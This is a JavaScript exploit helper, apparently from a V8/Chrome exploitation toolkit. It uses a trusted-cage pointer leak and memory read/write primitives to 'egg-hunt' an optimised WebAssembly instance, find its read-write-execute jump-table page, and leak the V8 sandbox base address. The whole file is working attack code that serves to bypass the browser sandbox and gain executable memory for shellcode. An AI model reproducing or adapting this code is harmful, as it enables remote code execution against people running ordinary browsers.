// RWX helper
// Egg-hunting in the trusted cage to retrieve WASM RWX memory page from a trusted cage pointer leak
// Work on x64 only
{
    var SANDBOX_BASE, WASM_RWX_ADDR, WASM_RWX_CALLER;
    var _RWX_HELPERS;
    if (typeof _RWX_HELPERS === "undefined") {
        _RWX_HELPERS = {};
    }


    // Egg-Hunting WASM instances in the trusted cage
    // Require wasm-module-builder.js
    let WASM_I64_EGG = 0x1337deadbeef1337n;
    let WASM_EGG_BODY = [
        ...wasmI64Const(WASM_I64_EGG),
        ...wasmI64Const(Date.now()),    // force creation of new RWX memory pages on reload
        kExprDrop,                      // drop timestamp
    ];
    /* optimized code should look like:
        0x00  push rbp
        0x01  mov rbp, rsp
        0x04  push 8
        0x06  push rsi
        0x07  mov rax, 1337DEADBEEF1337h -> EGG is at 0x09
        0x11  mov rsp, rbp
        0x14  pop rbp
        0x15  ret
    */


    // Check if a WASM instance includes the egg
    let checkEgg = (wasm_instance_addr) => {
        let egg_offset = 0x09n;

        let wasm_instance = new STRUCTS.WasmTrustedInstanceData(wasm_instance_addr);
        let jump_table_start = getBigUint(wasm_instance.jump_table_start);
        if (jump_table_start > 0n && !(jump_table_start % 0x1000n)) {
            let jmp = getBigUint(jump_table_start, 4);
            if ((jmp & 0xffn) === 0xe9n) {
                let jmp_addr = jmp >> 8n;
                let egg_addr = jump_table_start+jmp_addr+0x5n+egg_offset;

                if (getBigUint(egg_addr) === WASM_I64_EGG) {
                    setBigUint(egg_addr, 0x0n);  // remove the egg
                    return true;
                }
            }
        }

        return false;
    }


    // Identify a WASM trusted instance data in the trusted space using specific patterns
    let checkPattern = (addr) => {
        let wasm_instance = new STRUCTS.WasmTrustedInstanceData(addr);
        let memory0_start = getBigUint(wasm_instance.memory0_start);
        let globals_start = getBigUint(wasm_instance.globals_start);

        // memory0_start = empty backing store -> 4 lower bytes = 0xffffffff
        if ((memory0_start & 0xffffffffn) !== 0xffffffffn) {
            return false;
        }

        // globals_start = empty backing store -> 4 lower bytes = 0xffffffff
        if ((globals_start & 0xffffffffn) !== 0xffffffffn) {
            return false;
        }

        // memory0_start = globals_start = empty backing store
        return memory0_start === globals_start;
    }


    // Find a new egged WASM instance (remove the egg once found)
    // The WASM exported function must have been optimized
    // Leak SANDBOX_BASE
    let wasm_instances = [];
    let getMyNewWasmInstance = (TRUSTED_CAGE_SAFE_START, TRUSTED_CAGE_SAFE_END) => {
        let maxoffset = (new STRUCTS.WasmTrustedInstanceData()).jump_table_start;
        let addr = tagPtr(TRUSTED_CAGE_SAFE_END - maxoffset);           // traverse the trusted cage in reverse to find new instances first (prevent crash in specific cases)
        while (addr >= TRUSTED_CAGE_SAFE_START                          // search limit to prevent crash
        && !(
            isStrongTaggedPtr(addr)                                     // check only valid tagged pointers
            && !wasm_instances.includes(addr)                           // ignore previous wasm instances
            && checkPattern(addr)                                       // check wasm instance patterns
            && wasm_instances.push(addr)                                // save found wasm instances
            && checkEgg(addr)                                           // check if the wasm instance contains the egg
        )) {
            addr -= 8n;
        }

        assert(addr >= TRUSTED_CAGE_SAFE_START, "[-] Failed to reliably find an egged WASM instance in the trusted cage", 3, true)
        return addr;
    }


    // Retrieve a new RWX callable memory page from a WASM module
    // Retrieved JS2WASM function takes n_args arguments and return a result (BigInt)
    // If a previous RWX + JS2WASM has been created in the past with equal n_args, use it
    // TRUSTED_CAGE_LEAK -> SANDBOX_BASE, WASM_RWX_ADDR, WASM_RWX_CALLER
    let rwx = {};
    _RWX_HELPERS.huntRWX = (n_args=0) => {
        log(`[i] Egg-hunting in the trusted cage to find a WASM RWX memory page`, 1);
        assert(typeof TRUSTED_CAGE_LEAK !== "undefined", "[-] TRUSTED_CAGE_LEAK is not set");

        var TRUSTED_CAGE_BASE = TRUSTED_CAGE_LEAK & ~0xffffffffn;
        let TRUSTED_CAGE_SAFE_START = TRUSTED_CAGE_LEAK & ~(0x40000n-1n);
        if (TRUSTED_CAGE_SAFE_START === TRUSTED_CAGE_BASE) TRUSTED_CAGE_SAFE_START += 0x40000n;
        let TRUSTED_CAGE_SAFE_END = TRUSTED_CAGE_SAFE_START + 0x40000n;
        log(`[i] Trusted cage leak: TRUSTED_CAGE_BASE=0x${hex(TRUSTED_CAGE_BASE)}, TRUSTED_CAGE_SAFE_START=0x${hex(TRUSTED_CAGE_SAFE_START)}, TRUSTED_CAGE_SAFE_END=0x${hex(TRUSTED_CAGE_SAFE_END)}`, 2);

        if (n_args in rwx) {
            [WASM_RWX_ADDR, WASM_RWX_CALLER] = rwx[n_args];
        }

        let builder = new WasmModuleBuilder();
        let sig = makeSig(Array(n_args).fill(kWasmI64), [kWasmI64]);
        builder.addFunction("main", sig).addBody(WASM_EGG_BODY).exportFunc();

        let instance = builder.instantiate();
        let main = instance.exports.main;
        let args = Array(n_args).fill(0n);
        optimize(main, ...args);

        let wasm_instance_addr;
        while (main(...args) === WASM_I64_EGG) {
            wasm_instance_addr = getMyNewWasmInstance(TRUSTED_CAGE_SAFE_START, TRUSTED_CAGE_SAFE_END);
        }

        let wasm_instance = new STRUCTS.WasmTrustedInstanceData(wasm_instance_addr);
        let jump_table_start = getBigUint(wasm_instance.jump_table_start);
        assert(jump_table_start > 0n && !(jump_table_start % 0x1000n), "[-] Invalid jump_table_start pointer");

        // Leak the sandbox base address using the empty backing store (which is at the end of the sandbox)
        if (typeof SANDBOX_BASE === "undefined") {
            let empty_backing_store = getBigUint(wasm_instance.memory0_start);
            SANDBOX_BASE = ((empty_backing_store+1n) & 0xffffffff00000000n) - 0x10000000000n;
            log("[+] Leaked SANDBOX_BASE=0x" + hex(SANDBOX_BASE), 2);
            assert((SANDBOX_BASE > 0x0n) && ((SANDBOX_BASE & 0xffffffffn) === 0x0n), "[-] Invalid SANDBOX_BASE pointer");
        }

        [WASM_RWX_ADDR, WASM_RWX_CALLER] = [jump_table_start, main];
        rwx[n_args] = [WASM_RWX_ADDR, WASM_RWX_CALLER];
        log("[+] Created WASM RWX memory page at 0x" + hex(WASM_RWX_ADDR), 2);
    }
}
